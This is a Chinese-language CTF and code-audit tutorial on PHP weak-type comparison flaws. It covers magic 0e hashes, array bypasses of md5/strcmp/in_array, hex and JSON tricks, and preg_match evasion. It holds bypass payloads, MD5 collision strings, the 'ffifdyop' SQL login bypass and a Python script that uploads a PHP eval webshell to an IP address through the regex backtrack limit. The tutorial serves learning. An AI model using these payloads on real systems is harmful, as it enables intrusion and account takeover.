## php弱类型比较

> 创建: 未知 | 更新: 2026-05-21 | 适用: PHP 5.x / 7.x | ⚠️ 部分图片托管于外部CDN

### 弱类型与强类型

通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。我们称之为强类型，而弱类型可以随意转换变量的类型例如可以这样：

```
$text=1;$text=”string”
```

也就是说php并不会验证变量的类型，可以随时的转换类型，估计开发者的意图是让程序员可以进行更高效的开发，所以在大量内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而报错，虽然提升了效率，但是引发了很多安全问题。
类型转换问题
类型转换最常见的就是int转String,String转int。
**Int转String:**
$num = 5;
方式1：item=(string)num;
方式2：item=strval(num);
**String转int:**
intval() 函数。(取整函数)
主要问题就出现在这个intval()函数上了。
**例子：**

```
var_dump(intval(4))//4
var_dump(intval(‘1asd’))//1
var_dump(intval(‘asd1’))//0
```

上面三个例子说明了intval（）函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错，而是返回0。

```
<?php
if($_GET[id]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
    mysql_select_db(SAE_MYSQL_DB);
    $id = intval($_GET[id]);
    $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
    if ($_GET[id]==1024) {
        echo "<p>no! try again</p>";
    }
    else{ 
        echo($query[content]);  
    }
}
?>
```

本题输入1024.1即可绕过

### ==与===

**php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。**
在php中有两种比较符号: 一种是 ==，另外一种是 ===，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:

1. == ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。
2. === ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型

**转换规则：**
1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。
若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0；
例如:

```
 var_dump(12=="12")                                   // true
 var_dump(12=="12aa")                              //true
 var_dump( "admin"==0)                                //true
 var_dump(false==""==0==NULL)                        //true
```

1. 布尔值true和任意字符串都弱相等。例如:

```
var_dump(true=="hyuf")                   //true
```

1. 数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较； (例外:-1.3e3转换为浮点数是-1300)
2. 0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；
3. 当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。
   例题:

```
<?php
show_source(__FILE__);
$a=@$_GET['a'];
$b=@$_GET['b'];
if ($a==0 and $a){
    echo "this is flag1";
}
if(is_numeric($b)){
    exit();
}
if ($b>1234){
    echo "this is flag2";
}
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663916772482-0a859568-2fd9-4c46-88e9-682985095366-16691231881951.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1663916772482-0a859568-2fd9-4c46-88e9-682985095366-16691231881951.png)
a为0但是a又恒为true，我们直接传入一个字母即可 //根据转换规则一
b变量要得到flag必须不是一个数字，但是又要与数字比较，我们传入任意一个比1234大的数字，然后再加上字母即可绕过。 //根据转换规则一

### hash比较操作符问题

```
 <?php
show_source(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
if (md5($a) == md5($b)&&$a!=$b){
    print("this is flag!");
}
?> 
```

#### 数组绕过(==和===都适用)

```
md5(string,raw)
md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过
```

我们直接传入数组即可绕过

```
http://127.0.0.1/test.php?a[]=1&b[]=2
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663919320968-ea0a76f6-3f11-491e-9e2f-53475e0abca5.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1663919320968-ea0a76f6-3f11-491e-9e2f-53475e0abca5.png)

#### md5碰撞

```
<?php
show_source(__FILE__);
$str1 = (string)$_GET['str1'];
$str2 = (string)$_GET['str2'];
if (!empty($str1)&&!empty($str2)){
    if ($str1!=$str2){
        if (md5($str1) === md5($str2)) {
            print ("this is flag");
        }   
    }
}
?>
```

由于强制类型转换，传数组就不可行了，这里就需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了
下载链接:http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip
1.在目录下新建立一个文件如下
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033361111-43dbc858-3a86-4e0e-ba38-6c58f5d42496.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664033361111-43dbc858-3a86-4e0e-ba38-6c58f5d42496.png)
2.将这个文件拖到fastcoll_v1.0.0.5.exe上，等于使用fastcoll打开它。
3.fastcoll会自动生成两个文件：
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663925372001-9f7671f0-2ff8-4b8d-9fd5-92f6acbdc23a.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1663925372001-9f7671f0-2ff8-4b8d-9fd5-92f6acbdc23a.png)
这两个文件内容不同，但是md5值是相同的。
然后我们写一个php脚本根据生成的文件生成碰撞的字符串：

```
<?php
function readmyfile($path){
    $fh = fopen($path, "rb");
    $data = fread($fh, filesize($path));
    fclose($fh);
    return $data;
}
$a = urlencode(readmyfile("HY_msg1.txt"));
$b = urlencode(readmyfile("HY_msg2.txt"));
if(md5((string)urldecode($a))===md5((string)urldecode($b))){
    echo "a=";
    echo $a;
    echo "\n";
}
if(urldecode($a)!=urldecode($b)){
    echo "b=";
    echo $b;
}
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033454749-29f51681-e0f7-46fd-a3b7-afbae9586942.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664033454749-29f51681-e0f7-46fd-a3b7-afbae9586942.png)

```
a=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17
b=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17
收录一些MD5值相等的字符串
      $Param1="fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B"
      $Param2="fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B"
      
    $Param1="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
    $Param2="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";

    $data1="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70";
    $data2="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70";
```

传入我们生成的两个值

```
http://127.0.0.1/test.php?str1=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17&str2=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17
```

成功获得flag
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033627297-8e5b705a-634b-460a-9375-3634ea0257b1.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664033627297-8e5b705a-634b-460a-9375-3634ea0257b1.png)

#### 0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较==才适用)

比如将两个md5值进行弱类型比较

```
md5('QNKCDZO') == md5(240610708) 
MD5加密后会变成这个样子
0e830400451993494058024219903391 == 0e462097431906509019562988736854
```

由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样
0 == 0
返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等
常见md5为0e开头的字符串

```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
#授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。
#上面脚本注释部分是双MD5碰撞，取消注释然后注释掉24行stopxxx即可。
#使用方法：python md5Crack.py "你要碰撞的字符串" 字符串的起始位置
#例如：python md5Crack.py “0e" 0
#将产生MD5值为0e开头的字符串。
#使用环境:python2
#使用时请将上述注释全部删除

# -*- coding: utf-8 -*-
import multiprocessing
import hashlib
import random
import string
import sys
CHARS = string.letters + string.digits
def cmp_md5(substr, stop_event, str_len,start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds)
        value = md5.hexdigest()
        if value[start: start+str_len] == substr:
            print rnds
            stop_event.set()
            '''
            #碰撞双md5
            md5 = hashlib.md5(value)
            if md5.hexdigest()[start: start+str_len] == substr:
                print rnds+ "=>" + value+"=>"+ md5.hexdigest()  + "\n"
                stop_event.set()
            '''
 
if __name__ == '__main__':
    substr = sys.argv[1].strip()
    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0
    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                         stop_event, str_len, start_pos))
                 for i in range(cpus)]
    for p in processes:
        p.start()
    for p in processes:
        p.join()
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663922788700-7d0c2c85-a2f9-4d71-af8e-ec0d941ba1e9.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1663922788700-7d0c2c85-a2f9-4d71-af8e-ec0d941ba1e9.png)

#### 绕过md5构造恒为真语句

```
select * from 'admin' where password=md5($pass,true)
```

pass输入

```
ffifdyop
```

这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，
而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’。等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数

#### 特殊的md5值

双md5结果仍为0e开头字符串大全

```
      0e215962017
        
        0e291242476940776845150308577824 


        CbDLytmyGm2xQyaLNhWn
     
    md5(CbDLytmyGm2xQyaLNhWn) => 0ec20b7c66cafbcc7d8e8481f0653d18
     
    md5(md5(CbDLytmyGm2xQyaLNhWn)) => 0e3a5f2a80db371d4610b8f940d296af
     
    770hQgrBOjrcqftrlaZk
     
    md5(770hQgrBOjrcqftrlaZk) => 0e689b4f703bdc753be7e27b45cb3625
     
    md5(md5(770hQgrBOjrcqftrlaZk)) => 0e2756da68ef740fd8f5a5c26cc45064
     
    7r4lGXCH2Ksu2JNT3BYM
     
    md5(7r4lGXCH2Ksu2JNT3BYM) => 0e269ab12da27d79a6626d91f34ae849
     
    md5(md5(7r4lGXCH2Ksu2JNT3BYM)) => 0e48d320b2a97ab295f5c4694759889f
```

### 十六进制转换问题

我们来看一个例子:

```
<?php
if ("0x1e240"=="123456"){
    print "1\n";
    if ("0x1e240"==123456){
        print "2\n";
        if ("0x1e240"=="1e240"){
            print "3";
        }
    }
}
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664034227137-6faf04cb-61b1-4d5e-9440-6dae4bb92b20.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664034227137-6faf04cb-61b1-4d5e-9440-6dae4bb92b20.png)
php在接受一个带0x的字符串的时候，会自动把这行字符串解析成十进制的再进行比较，0x1e240解析成十进制就是123456，并且与字符串类型的123456和int型的123456都相同。
ctf题目:

```
<?php
    function noother_says_correct($number){
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++) {
            $digit = ord($number{$i});
            if ( ($digit >= $one) && ($digit <= $nine) ) {
                return false;
            }
        }
        return $number == '54975581388';
    }
    $flag='flag{This_Is_f1ag}';
    if(noother_says_correct($_GET['key']))
        echo $flag;
    else
        echo 'access denied';
```

题目的大概意思就是说，我们要传入一个字符串，里面没有数字，但是要和54975581388相等，而54975581388这个数的16进制很巧妙，没有任何数字

```
print base_convert("54975581388",10,16);  //ccccccccc
```

那我们就可以用16进制来绕过
payload:

```
http://127.0.0.1/test.php?key=0xccccccccc
```

### json绕过

JSON概念很简单，JSON 是一种轻量级的数据格式，他基于 javascript 语法的子集，即数组和对象表示。由于使用的是 javascript 语法，因此JSON 定义可以包含在javascript 文件中，对其的访问无需通过基于 XML 的语言来额外解析。
示例:

```
<?php
if (isset($_POST['message'])) {
    $message = json_decode($_POST['message']);
    $key ="*********";
    if ($message->key == $key) {
        echo "flag";
    }
    else {
        echo "fail";
    }
}
else{
     echo "~~~~";
}
?>
```

输 入一个数组进行json解码，如果解码后的message与key值相同，会得到flag，主要思想还是弱类型进行绕过，我们不知道key值是什莫，但是我们知道一件事就是它肯定是字符串(当然，这里的前提条件是key中没有数字)，这样就可以了，上文讲过，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了。最终payload message={“key”:0}。
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664112502794-d8342c7e-bf22-4eee-9c3b-96463cb2bf28.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664112502794-d8342c7e-bf22-4eee-9c3b-96463cb2bf28.png)

## php内置函数的松散性

主要意思就是php内部函数在调用时给函数传递函数无法接受的参数类型但是却没有报错的情况

### MD5 ，sha1绕过

这两个都是加密函数，分别给字符串进行MD5加密和计算字符串的 SHA-1 散列。
但是这个函数都有着缺陷，就是不能处理数组，这样就很容易被绕过了

```
<?php
if (isset($_POST['a']) and isset($_POST['b'])) {
    if ($_POST['a'] != $_POST['b'])
        if (md5($_POST['a']) === md5($_POST['b']))
            die("flag{This_Is_F1ag}");
    else
        print 'Wrong.';
}
?>
```

直接构造数组就可以绕过了payload: a[]=1&b[]=2
也就是上文的hash比较中的数组绕过，为了方便总结hash的知识点，就把那里的绕过方法都写了上去

### switch绕过

缺陷原理相同，绕过姿势相同，如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：

```
<?php
$i ="3name";
switch ($i) {
    case 0:case 1:case 2:
        echo "this is two";
        break;
        case 3:
            echo "flag{This_is_f1ag}";
            break;
}
?>
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664113177992-39954b95-885f-4b97-a02a-e5d6f30c7eb8.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664113177992-39954b95-885f-4b97-a02a-e5d6f30c7eb8.png)

### strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )

strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值

```
<?php
$password="***************";
if(isset($_POST['password'])){
if (strcmp($_POST['password'], $password) == 0) {
        echo "Right!!!login success";
        exit();     
} else { 
    echo "Wrong password..";      
}?>
```

在这个题目中我们需要自己输入一个password的值和$password相比较但是我们不知道这个password的值，有可能时字符串有可能时数字，这个时候怎末办呢，依然时相同的绕过姿势，试一试数组绕过假设如果传入一个数组会怎末样呢？我们传入password[]=xxx ，绕过成功。
原理是因为函数接受到了不符合的类型，将发生错误，函数返回值为0，所以判断相等。
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664115029345-c4396917-332e-43ca-8625-e84c1f5fe398.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664115029345-c4396917-332e-43ca-8625-e84c1f5fe398.png)

### array_search（）、in_array()绕过

```
mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) 
```

array_search() 函数在数组中搜索某个键值，并返回对应的键名。
in_array() 函数搜索数组中是否存在指定的值。
基本功能是相同的，也就是说绕过姿势也相同。Array系列有两种安全问题，一种是正常的数组绕过，一种是
“= =”号问题。先讲第一个数组绕过。
如果两个函数的第三个参数为true那么下列方法就无效了
needle，haystack必需，strict可选 函数判断haystack中的值是存在needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤

#### 数组绕过

```
<?php
if(!is_array($_GET['test'])){
    exit();}
$test=$_GET['test'];
for($i=0;$i<count($test);$i++){
    if($test[$i]==="admin"){
        echo "error";
        exit();
    }
    $test[$i]=intval($test[$i]);
}
if(array_search("admin",$test)===0){
    echo "flag";
}
else{
    echo "false";
}
?>
```

先判断是不是数组，然后在把数组中的内容一个个进行遍历，所有内容都不能等于admin,类型也必须相同，然后转化成int型，然后再进行比较如果填入值与admin相同，则返回flag,如何绕过呢？
基本思路还是不变，因为用的是三个等于号，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。这里的重点是intval函数，将数组里的数转换为了int类型，当”admin”这个字符串和数组的数据比较时会变为0，所以payload：test[]=0。 同理，因为intval将数组里的数转换为了int类型，所以我们传入一个字符串还是会变为0，最终效果和直接传入0是一样的。
payload：test[]=xxxxx
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664122013954-962e04ee-e03f-49b3-afbb-ae3cc4b1b61c.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664122013954-962e04ee-e03f-49b3-afbb-ae3cc4b1b61c.png)

#### ==问题

在PHP手册中，in_array()函数的解释是bool in_array ( mixed needle,arrayhaystack [, bool strict=FALSE]),如果strict参数没有提供或者是false(true会进行严格的过滤)，那么inarray就会使用松散比较来判断needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同
参考例子:

```
<?php
$array=[0,1,2,'3'];
var_dump(in_array('abc', $array));  //true
var_dump(in_array('1bc', $array));  //true
```

通过例子我们就知道了，这个松散的判断就是等于号，所以出现了“= =”号的特性“abc”==0、“1bc”==1，如果不加true的话就可以利用“= =”轻松绕过。array_search同理

## preg_match绕过

[![1270588-20200115184356475-448487219.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203268848-481347db-314f-49d6-8d10-90798407e863.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664203268848-481347db-314f-49d6-8d10-90798407e863.png)
[![1270588-20200115184407398-525177328.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203281706-4da909d4-bb4a-4c22-a766-b765b4620ef2.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664203281706-4da909d4-bb4a-4c22-a766-b765b4620ef2.png)
**绕过方法：**

### 数组绕过

preg_match只能处理字符串，当传入的subject是数组时会返回false

```
<?php
//模式分隔符后的"i"标记这是一个大小写不敏感的搜索
show_source(__FILE__);
$a = $_GET['x'];
if (preg_match("/php/i", $a)) {
    echo "查找到匹配的字符串 php。";
} else {
    echo "未发现匹配的字符串 php。";
}
?>
```

[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664205498275-3b5e7f1d-dbd6-4b3b-962d-2ff47b09c215.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664205498275-3b5e7f1d-dbd6-4b3b-962d-2ff47b09c215.png)
此时我们传入的数组中有flag，但是并没有检测到

### PCRE回溯次数限制

题目:pcrewaf

```
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
}
```

大意是判断一下用户输入的内容有没有PHP代码，如果没有，则写入文件。这种时候，如何绕过is_php()函数来写入webshell呢？
PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664206312119-a1275f6a-f3b0-4d55-bd36-d6aa1f4558b5.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664206312119-a1275f6a-f3b0-4d55-bd36-d6aa1f4558b5.png)
我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。
poc:

```
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
print(res.headers)
```

题目二:

```
<?php
show_source(__FILE__);
function areyouok($greeting){
    return preg_match('/Merry.*Christmas/is',$greeting);
}

$greeting=@$_POST['greeting'];

if(!is_array($greeting)){
    if(!areyouok($greeting)){
    if(strpos($greeting,'Merry Christmas')!==false){
        echo 'Merry Christmas. '.'flag{This_is_F1ag}';
    }else{
